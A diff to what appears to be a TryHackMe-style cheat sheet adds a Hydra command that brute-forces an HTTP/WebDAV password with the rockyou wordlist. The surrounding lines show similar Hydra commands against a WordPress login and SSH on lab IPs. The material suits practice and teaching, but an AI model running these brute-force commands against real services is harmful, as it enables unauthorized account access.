@@ -127,6 +127,11 @@ crack wordpress login password on wp-login
 hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.67.83 -t 4 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=incorrect" (wordpress)
 ```
 
+crack http/webdav password
+```
+hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.187.219 http-get /protected -t 4 -V
+```
+
 crack password for ssh
 ```
 hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 ssh
